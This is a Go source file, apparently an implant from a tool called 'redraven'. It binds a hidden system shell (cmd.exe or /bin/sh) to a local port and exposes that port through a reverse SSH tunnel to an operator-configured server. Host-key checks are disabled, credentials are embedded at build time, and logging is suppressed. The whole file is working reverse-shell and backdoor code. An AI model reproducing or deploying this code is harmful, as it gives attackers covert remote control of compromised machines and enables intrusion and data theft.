package main

import (
	b64 "encoding/base64"
	"io"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strconv"

	"redraven/shell"

	"golang.org/x/crypto/ssh"
)

const nixShellPath = "/bin/sh"
const winShellPath = "C:\\Windows\\System32\\cmd.exe"

var (
	pemAuth    string
	pemFile    string
	servPasswd string
	sshServer  string
	shellPath  string
	servUser   string
	//pivKeyFile           = "/some/dir/privkey.pem"
	bindListenerAddr = "127.0.0.1:8080"
	localAddr        = "127.0.0.1:8080"
	remoteAddr       = "127.0.0.1:8080"
)

func handleClient(client net.Conn, remote net.Conn) {
	defer client.Close()
	chDone := make(chan bool)

	// Start remote to local data transfer
	go func() {
		_, err := io.Copy(client, remote)
		if err != nil {
			//log.Println(fmt.Sprintf("error while copy remote->local: %s", err))
			os.Exit(1)
		}
		chDone <- true
	}()

	// Start local to remote data transfer
	go func() {
		_, err := io.Copy(remote, client)
		if err != nil {
			//log.Println(fmt.Sprintf("error while copy local->remote: %s", err))
			os.Exit(1)
		}
		chDone <- true
	}()

	<-chDone
}

func handleConnection(conn net.Conn) {
	//log.Printf("Connection received from %s. Opening shell.",conn.RemoteAddr())
	conn.Write([]byte("Connection established. Opening shell.\n"))

	if runtime.GOOS == "windows" {
		command := exec.Command(winShellPath) //shellPath
		shell.SetHide(command)
		command.Stdin = conn
		command.Stdout = conn
		command.Stderr = conn
		command.Run()
		//log.Printf("Shell ended for %s", conn.RemoteAddr())
	} else {
		command := exec.Command(nixShellPath) //shellPath
		command.Stdin = conn
		command.Stdout = conn
		command.Stderr = conn
		command.Run()
		//log.Printf("Shell ended for %s", conn.RemoteAddr())
	}
}

func bindListener() {
	listener, err := net.Listen("tcp", bindListenerAddr)
	if err != nil {
		//log.Fatal("Error connecting. ", err)
		os.Exit(1)
	}
	defer listener.Close()
	//log.Println("Now listening for connections.")

	// Listen and serve forever
	for {
		conn, err := listener.Accept()
		if err != nil {
			//log.Println("Error accepting connection. ", err)
			os.Exit(1)
		}
		go handleConnection(conn)
	}
}

func main() {
	pemAuthSetting, err := strconv.ParseBool(pemAuth)
	if err != nil {
		//log.Fatalf("Failed to parse bool:%v", err)
		os.Exit(1)
	}
	pemKey, err := b64.StdEncoding.DecodeString(pemFile)
	if err != nil {
		//log.Fatalf("Decode key failed:%v", err)
		os.Exit(1)
	}
	go bindListener()
	sshConfig := &ssh.ClientConfig{}
	if pemAuthSetting == true {
		signer, err := ssh.ParsePrivateKey([]byte(pemKey))
		if err != nil {
			//log.Fatalf("parse key failed:%v", err)
			os.Exit(1)
		}
		sshConfig = &ssh.ClientConfig{
			User: servUser,
			Auth: []ssh.AuthMethod{
				//publicKeyFile(pivKeyFile),
				ssh.PublicKeys(signer),
			},
			HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		}
	} else {
		sshConfig = &ssh.ClientConfig{
			User: servUser,
			Auth: []ssh.AuthMethod{
				ssh.Password(servPasswd),
			},
			HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		}
	}

	serverConn, err := ssh.Dial("tcp", sshServer, sshConfig)
	if err != nil {
		//log.Fatalln(fmt.Printf("Dial INTO remote server error: %s", err))
		os.Exit(1)
	}

	// Listen on remote server port
	listener, err := serverConn.Listen("tcp", remoteAddr)
	if err != nil {
		//log.Fatalln(fmt.Printf("Listen open port ON remote server error: %s", err))
		os.Exit(1)
	}
	defer listener.Close()

	// handle incoming connections on reverse forwarded tunnel
	for {
		// Open a (local) connection to localEndpoint whose content will be forwarded so serverEndpoint
		local, err := net.Dial("tcp", localAddr)
		if err != nil {
			//log.Fatalln(fmt.Printf("Dial INTO local service error: %s", err))
			os.Exit(1)
		}
		client, err := listener.Accept()
		if err != nil {
			//log.Fatalln(err)
			os.Exit(1)
		}
		handleClient(client, local)
	}
}
